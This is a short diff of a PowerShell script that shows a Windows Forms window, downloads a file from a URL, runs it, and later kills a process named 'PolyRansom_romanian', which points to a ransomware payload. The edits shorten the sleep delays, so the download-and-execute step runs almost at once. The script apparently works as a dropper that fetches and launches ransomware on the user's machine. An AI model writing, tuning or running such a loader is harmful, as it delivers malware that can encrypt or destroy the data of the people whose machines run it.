@@ -4,6 +4,7 @@ $webClient = New-Object System.Net.WebClient
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.Windows.Input
 
 $form = New-Object System.Windows.Forms.Form
 $form.StartPosition = 'Manual' 
@@ -37,7 +38,7 @@ $form.Add_MouseDown({
 
 $form.ShowDialog()
 
-Start-Sleep -Seconds 60
+Start-Sleep -Seconds 1
 $webClient.DownloadFile($url, $downloadPath)
 if (Test-Path $downloadPath) {
     Start-Process -FilePath $downloadPath -Wait
@@ -46,6 +47,6 @@ if (Test-Path $downloadPath) {
 
 }
 
-Start-Sleep -Seconds 120
+Start-Sleep -Seconds 60
 
 Stop-Process -Name "PolyRansom_romanian"
